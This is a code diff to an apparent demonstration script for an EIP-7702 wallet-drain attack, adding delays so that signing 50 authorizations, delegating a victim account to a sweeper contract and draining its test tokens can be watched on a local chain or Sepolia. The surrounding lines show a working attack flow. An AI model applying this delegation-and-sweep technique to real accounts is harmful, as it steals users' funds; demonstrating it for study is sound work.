@@ -8,6 +8,12 @@ const NUM_AUTHS = 50;
 const DEC = 6;
 const START_BALANCE = "2500000"; // minted to each fresh victim
 
+// Real attack on anvil finishes in ~100ms — too fast to watch. Pace the stream so the
+// sequence is presentable. The on-chain actions are unchanged; only the emit cadence is paced.
+// Set ATTACK_PACE_MS=0 to disable (e.g. on Sepolia, where block times pace it naturally).
+const PACE = Number(process.env.ATTACK_PACE_MS ?? 26);
+const sleep = (ms: number) => (ms > 0 ? new Promise((r) => setTimeout(r, ms)) : Promise.resolve());
+
 function env(k: string) {
   const v = process.env[k];
   if (!v) throw new Error(`Missing ${k} — run \`npm run setup\` (local) or configure .env (Sepolia).`);
@@ -51,8 +57,10 @@ export async function runAttack(emit: Emit) {
   for (let i = 0; i < NUM_AUTHS; i++) {
     auths.push(await victim.signAuthorization({ contractAddress: sweeper, chainId: chain.id, nonce: start + i }));
     E({ step: "sign-progress", msg: `Signed authorization ${i + 1}/${NUM_AUTHS}`, index: i + 1, nonce: start + i });
+    await sleep(PACE);
   }
   E({ step: "sign-done", msg: `All ${NUM_AUTHS} authorizations signed. Exactly one (nonce ${start}) matches and takes effect.`, matchingNonce: start });
+  await sleep(PACE * 14);
 
   // 2 — relayer broadcasts the delegation (victim nonce only advances via the authorization)
   E({ step: "delegate", msg: "Relayer broadcasting type-4 transaction carrying all 50 authorizations..." });
@@ -65,6 +73,7 @@ export async function runAttack(emit: Emit) {
   const delegated = !!code && code.toLowerCase().startsWith("0xef0100");
   E({ step: "verify", msg: delegated ? "Victim account is now DELEGATED to the sweeper (0xef0100 marker present)" : "No delegation marker found", delegated, code });
   if (!delegated) { E({ step: "error", msg: "Delegation did not take effect (check CHAIN_ID / nonce / RPC supports type-4)." }); return; }
+  await sleep(PACE * 14);
 
   // 3 — drain
   E({ step: "sweep", msg: "Calling sweeper to drain victim tUSD to attacker..." });
